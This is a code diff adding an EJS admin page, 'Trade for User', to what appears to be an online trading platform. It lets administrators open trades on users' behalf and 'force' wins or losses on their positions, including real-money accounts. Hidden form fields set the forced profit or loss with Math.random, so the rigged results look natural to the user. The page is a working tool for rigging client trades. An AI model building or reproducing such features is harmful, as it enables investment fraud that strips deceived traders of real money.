@@ -1,0 +1,623 @@
+<%- include('../partials/head') %>
+<%- include('../partials/navbar') %>
+
+<style>
+    .admin-trade-container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 24px 16px;
+    }
+
+    .page-header {
+        margin-bottom: 32px;
+    }
+
+    .page-title {
+        font-size: 32px;
+        font-weight: 800;
+        color: #f4f4f5;
+        margin-bottom: 8px;
+        background: linear-gradient(135deg, #8b5cf6, #a78bfa);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+    }
+
+    .page-subtitle {
+        color: #71717a;
+        font-size: 15px;
+    }
+
+    /* Stats Cards */
+    .stats-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+        gap: 16px;
+        margin-bottom: 32px;
+    }
+
+    .stat-card {
+        background: linear-gradient(135deg, #1a1a2e, #16213e);
+        border: 1px solid #2a2a3e;
+        border-radius: 16px;
+        padding: 24px;
+        position: relative;
+        overflow: hidden;
+    }
+
+    .stat-card::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        height: 3px;
+    }
+
+    .stat-card.total-users::before { background: linear-gradient(90deg, #8b5cf6, #a78bfa); }
+    .stat-card.open-positions::before { background: linear-gradient(90deg, #22c55e, #4ade80); }
+    .stat-card.force-win::before { background: linear-gradient(90deg, #f59e0b, #fbbf24); }
+    .stat-card.force-loss::before { background: linear-gradient(90deg, #ef4444, #f87171); }
+
+    .stat-label {
+        color: #71717a;
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        margin-bottom: 8px;
+    }
+
+    .stat-value {
+        font-size: 28px;
+        font-weight: 800;
+        color: #f4f4f5;
+        font-family: 'Courier New', monospace;
+    }
+
+    /* Users Table */
+    .section-card {
+        background: #111118;
+        border: 1px solid #1e1e2e;
+        border-radius: 20px;
+        padding: 24px;
+        margin-bottom: 24px;
+    }
+
+    .section-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+
+    .section-title {
+        font-size: 18px;
+        font-weight: 700;
+        color: #f4f4f5;
+    }
+
+    .search-box {
+        background: #0d0d14;
+        border: 1px solid #2a2a3e;
+        border-radius: 10px;
+        padding: 10px 16px;
+        color: #f4f4f5;
+        font-size: 14px;
+        width: 280px;
+    }
+
+    .search-box:focus {
+        outline: none;
+        border-color: #8b5cf6;
+    }
+
+    .users-table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    .users-table th {
+        color: #71717a;
+        font-size: 11px;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+        text-align: left;
+        padding: 14px 16px;
+        border-bottom: 1px solid #2a2a3e;
+        font-weight: 600;
+    }
+
+    .users-table td {
+        padding: 16px;
+        border-bottom: 1px solid #1e1e2e;
+        color: #a1a1aa;
+        font-size: 14px;
+    }
+
+    .users-table tr:hover {
+        background: rgba(139, 92, 246, 0.05);
+    }
+
+    .user-info {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .user-avatar {
+        width: 40px;
+        height: 40px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: white;
+        font-weight: 700;
+        font-size: 16px;
+    }
+
+    .user-name {
+        color: #f4f4f5;
+        font-weight: 600;
+        font-size: 14px;
+    }
+
+    .user-email {
+        color: #71717a;
+        font-size: 12px;
+    }
+
+    .account-badge {
+        display: inline-block;
+        padding: 4px 12px;
+        border-radius: 20px;
+        font-size: 11px;
+        font-weight: 700;
+        text-transform: uppercase;
+        letter-spacing: 0.5px;
+    }
+
+    .account-badge.real {
+        background: rgba(34, 197, 94, 0.15);
+        color: #22c55e;
+        border: 1px solid rgba(34, 197, 94, 0.3);
+    }
+
+    .account-badge.demo {
+        background: rgba(139, 92, 246, 0.15);
+        color: #a78bfa;
+        border: 1px solid rgba(139, 92, 246, 0.3);
+    }
+
+    .balance-display {
+        font-family: 'Courier New', monospace;
+        font-weight: 700;
+        color: #f4f4f5;
+        font-size: 15px;
+    }
+
+    .balance-display.demo {
+        color: #a78bfa;
+    }
+
+    .trading-mode-badge {
+        display: inline-block;
+        padding: 4px 10px;
+        border-radius: 6px;
+        font-size: 11px;
+        font-weight: 700;
+        text-transform: uppercase;
+    }
+
+    .trading-mode-badge.normal {
+        background: rgba(107, 114, 128, 0.2);
+        color: #9ca3af;
+    }
+
+    .trading-mode-badge.force_win {
+        background: rgba(34, 197, 94, 0.2);
+        color: #22c55e;
+    }
+
+    .trading-mode-badge.force_loss {
+        background: rgba(239, 68, 68, 0.2);
+        color: #ef4444;
+    }
+
+    .btn-trade {
+        background: linear-gradient(135deg, #8b5cf6, #6d28d9);
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 10px;
+        font-size: 13px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.2s;
+        text-decoration: none;
+        display: inline-block;
+    }
+
+    .btn-trade:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 8px 20px rgba(139, 92, 246, 0.3);
+    }
+
+    .btn-trade-small {
+        background: #1e1e2e;
+        color: #a78bfa;
+        border: 1px solid #2a2a3e;
+        padding: 6px 12px;
+        border-radius: 6px;
+        font-size: 12px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+
+    .btn-trade-small:hover {
+        background: #2a2a3e;
+        border-color: #8b5cf6;
+    }
+
+    /* Managed Positions Section */
+    .positions-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+        gap: 16px;
+    }
+
+    .position-card {
+        background: #0d0d14;
+        border: 1px solid #1e1e2e;
+        border-radius: 16px;
+        padding: 20px;
+        position: relative;
+    }
+
+    .position-card.force-win {
+        border-left: 3px solid #22c55e;
+    }
+
+    .position-card.force-loss {
+        border-left: 3px solid #ef4444;
+    }
+
+    .position-card.no-force {
+        border-left: 3px solid #71717a;
+    }
+
+    .position-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: flex-start;
+        margin-bottom: 12px;
+    }
+
+    .position-pair {
+        font-size: 18px;
+        font-weight: 800;
+        color: #f4f4f5;
+    }
+
+    .position-direction {
+        padding: 4px 10px;
+        border-radius: 6px;
+        font-size: 11px;
+        font-weight: 700;
+        text-transform: uppercase;
+    }
+
+    .position-direction.buy {
+        background: rgba(34, 197, 94, 0.2);
+        color: #22c55e;
+    }
+
+    .position-direction.sell {
+        background: rgba(239, 68, 68, 0.2);
+        color: #ef4444;
+    }
+
+    .position-user {
+        color: #a78bfa;
+        font-size: 13px;
+        margin-bottom: 12px;
+    }
+
+    .position-details {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 8px;
+        margin-bottom: 16px;
+    }
+
+    .position-detail {
+        display: flex;
+        justify-content: space-between;
+        font-size: 13px;
+    }
+
+    .position-detail-label {
+        color: #71717a;
+    }
+
+    .position-detail-value {
+        color: #f4f4f5;
+        font-weight: 600;
+        font-family: 'Courier New', monospace;
+    }
+
+    .position-actions {
+        display: flex;
+        gap: 8px;
+    }
+
+    .btn-close-win {
+        flex: 1;
+        background: rgba(34, 197, 94, 0.15);
+        color: #22c55e;
+        border: 1px solid rgba(34, 197, 94, 0.3);
+        padding: 10px;
+        border-radius: 8px;
+        font-size: 12px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+
+    .btn-close-win:hover {
+        background: #22c55e;
+        color: white;
+    }
+
+    .btn-close-loss {
+        flex: 1;
+        background: rgba(239, 68, 68, 0.15);
+        color: #ef4444;
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        padding: 10px;
+        border-radius: 8px;
+        font-size: 12px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.2s;
+    }
+
+    .btn-close-loss:hover {
+        background: #ef4444;
+        color: white;
+    }
+
+    .force-badge {
+        position: absolute;
+        top: 12px;
+        right: 12px;
+        padding: 2px 8px;
+        border-radius: 4px;
+        font-size: 10px;
+        font-weight: 700;
+        text-transform: uppercase;
+    }
+
+    .force-badge.win {
+        background: rgba(34, 197, 94, 0.2);
+        color: #22c55e;
+    }
+
+    .force-badge.loss {
+        background: rgba(239, 68, 68, 0.2);
+        color: #ef4444;
+    }
+
+    /* Alert */
+    .alert {
+        padding: 16px 20px;
+        border-radius: 12px;
+        margin-bottom: 24px;
+        font-size: 14px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .alert-success {
+        background: rgba(34, 197, 94, 0.1);
+        border: 1px solid rgba(34, 197, 94, 0.3);
+        color: #22c55e;
+    }
+
+    .alert-error {
+        background: rgba(239, 68, 68, 0.1);
+        border: 1px solid rgba(239, 68, 68, 0.3);
+        color: #ef4444;
+    }
+
+    .empty-state {
+        text-align: center;
+        padding: 60px 20px;
+        color: #52525b;
+    }
+
+    .empty-state-icon {
+        font-size: 48px;
+        margin-bottom: 16px;
+    }
+</style>
+
+<div class="admin-trade-container">
+    <div class="page-header">
+        <h1 class="page-title">Trade for User</h1>
+        <p class="page-subtitle">Open and manage trades on behalf of users. Control win/loss outcomes.</p>
+    </div>
+
+    <!-- Flash Messages -->
+    <% if (success_msg && success_msg.length > 0) { %>
+        <div class="alert alert-success">✅ <%= success_msg %></div>
+    <% } %>
+    <% if (error_msg && error_msg.length > 0) { %>
+        <div class="alert alert-error">❌ <%= error_msg %></div>
+    <% } %>
+
+    <!-- Stats -->
+    <div class="stats-grid">
+        <div class="stat-card total-users">
+            <div class="stat-label">Total Users</div>
+            <div class="stat-value"><%= users.length %></div>
+        </div>
+        <div class="stat-card open-positions">
+            <div class="stat-label">Admin Managed Positions</div>
+            <div class="stat-value"><%= adminManagedPositions.length %></div>
+        </div>
+        <div class="stat-card force-win">
+            <div class="stat-label">Force Win Active</div>
+            <div class="stat-value"><%= adminManagedPositions.filter(p => p.forced_result === 'win').length %></div>
+        </div>
+        <div class="stat-card force-loss">
+            <div class="stat-label">Force Loss Active</div>
+            <div class="stat-value"><%= adminManagedPositions.filter(p => p.forced_result === 'loss').length %></div>
+        </div>
+    </div>
+
+    <!-- Users List -->
+    <div class="section-card">
+        <div class="section-header">
+            <h3 class="section-title">Select User to Trade For</h3>
+            <input type="text" class="search-box" id="userSearch" placeholder="Search users..." onkeyup="filterUsers()">
+        </div>
+        <table class="users-table">
+            <thead>
+                <tr>
+                    <th>User</th>
+                    <th>Account Type</th>
+                    <th>Real Balance</th>
+                    <th>Demo Balance</th>
+                    <th>Trading Mode</th>
+                    <th>Action</th>
+                </tr>
+            </thead>
+            <tbody id="usersTableBody">
+                <% users.forEach(u => { %>
+                    <tr data-username="<%= u.username.toLowerCase() %>" data-email="<%= u.email.toLowerCase() %>">
+                        <td>
+                            <div class="user-info">
+                                <div class="user-avatar"><%= u.username.charAt(0).toUpperCase() %></div>
+                                <div>
+                                    <div class="user-name"><%= u.username %></div>
+                                    <div class="user-email"><%= u.email %></div>
+                                </div>
+                            </div>
+                        </td>
+                        <td>
+                            <span class="account-badge <%= u.account_type %>">
+                                <%= u.account_type.toUpperCase() %>
+                            </span>
+                        </td>
+                        <td>
+                            <span class="balance-display">
+                                <%= formatCurrency(u.balance, u.currency) %>
+                            </span>
+                        </td>
+                        <td>
+                            <span class="balance-display demo">
+                                <%= formatCurrency(u.demo_balance, u.currency) %>
+                            </span>
+                        </td>
+                        <td>
+                            <span class="trading-mode-badge <%= u.trading_mode || 'normal' %>">
+                                <%= (u.trading_mode || 'normal').replace('_', ' ') %>
+                            </span>
+                        </td>
+                        <td>
+                            <a href="/admin/trade-for-user/<%= u.id %>" class="btn-trade">
+                                Trade for User →
+                            </a>
+                        </td>
+                    </tr>
+                <% }) %>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Admin Managed Positions -->
+    <% if (adminManagedPositions.length > 0) { %>
+    <div class="section-card">
+        <div class="section-header">
+            <h3 class="section-title">Currently Managed Positions</h3>
+            <a href="/admin/trade-for-user/logs" class="btn-trade-small">View Logs</a>
+        </div>
+        <div class="positions-grid">
+            <% adminManagedPositions.forEach(pos => { %>
+                <div class="position-card <%= pos.forced_result === 'win' ? 'force-win' : pos.forced_result === 'loss' ? 'force-loss' : 'no-force' %>">
+                    <% if (pos.forced_result !== 'none') { %>
+                        <span class="force-badge <%= pos.forced_result %>">
+                            Force <%= pos.forced_result %>
+                        </span>
+                    <% } %>
+                    <div class="position-header">
+                        <div>
+                            <div class="position-pair"><%= pos.pair_symbol %></div>
+                            <div class="position-user">@<%= pos.user_username %> (<%= pos.account_type %>)</div>
+                        </div>
+                        <span class="position-direction <%= pos.direction %>"><%= pos.direction %></span>
+                    </div>
+                    <div class="position-details">
+                        <div class="position-detail">
+                            <span class="position-detail-label">Size</span>
+                            <span class="position-detail-value"><%= pos.lot_size %> lots</span>
+                        </div>
+                        <div class="position-detail">
+                            <span class="position-detail-label">Entry</span>
+                            <span class="position-detail-value"><%= pos.entry_price.toFixed(5) %></span>
+                        </div>
+                        <div class="position-detail">
+                            <span class="position-detail-label">Leverage</span>
+                            <span class="position-detail-value">1:<%= pos.leverage_used %></span>
+                        </div>
+                        <div class="position-detail">
+                            <span class="position-detail-label">Margin</span>
+                            <span class="position-detail-value">$<%= pos.margin_required.toFixed(2) %></span>
+                        </div>
+                    </div>
+                    <div class="position-actions">
+                        <form action="/admin/trade-for-user/close-position/<%= pos.id %>" method="POST" style="flex:1;">
+                            <input type="hidden" name="forced_pnl" value="<%= Math.abs(pos.margin_required * 0.5 + Math.random() * pos.margin_required).toFixed(2) %>">
+                            <input type="hidden" name="notes" value="Force win closed by admin">
+                            <button type="submit" class="btn-close-win" onclick="return confirm('Close as WIN for @<%= pos.user_username %>?')">✓ Close Win</button>
+                        </form>
+                        <form action="/admin/trade-for-user/close-position/<%= pos.id %>" method="POST" style="flex:1;">
+                            <input type="hidden" name="forced_pnl" value="-<%= Math.abs(pos.margin_required * 0.3 + Math.random() * pos.margin_required * 0.5).toFixed(2) %>">
+                            <input type="hidden" name="notes" value="Force loss closed by admin">
+                            <button type="submit" class="btn-close-loss" onclick="return confirm('Close as LOSS for @<%= pos.user_username %>?')">✗ Close Loss</button>
+                        </form>
+                    </div>
+                    <div style="margin-top:12px;">
+                        <form action="/admin/trade-for-user/set-force-result/<%= pos.id %>" method="POST" style="display:flex;gap:8px;">
+                            <select name="forced_result" style="flex:1;background:#1e1e2e;border:1px solid #2a2a3e;border-radius:6px;padding:6px 10px;color:#f4f4f5;font-size:12px;">
+                                <option value="none" <%= pos.forced_result === 'none' ? 'selected' : '' %>>No Force</option>
+                                <option value="win" <%= pos.forced_result === 'win' ? 'selected' : '' %>>Force Win</option>
+                                <option value="loss" <%= pos.forced_result === 'loss' ? 'selected' : '' %>>Force Loss</option>
+                            </select>
+                            <button type="submit" class="btn-trade-small">Set</button>
+                        </form>
+                    </div>
+                </div>
+            <% }) %>
+        </div>
+    </div>
+    <% } %>
+</div>
+
+<%- include('../partials/footer') %>
+
+<script>
+    function filterUsers() {
+        const query = document.getElementById('userSearch').value.toLowerCase();
+        const rows = document.querySelectorAll('#usersTableBody tr');
+        rows.forEach(row => {
+            const username = row.dataset.username;
+            const email = row.dataset.email;
+            row.style.display = (username.includes(query) || email.includes(query)) ? '' : 'none';
+        });
+    }
+</script>
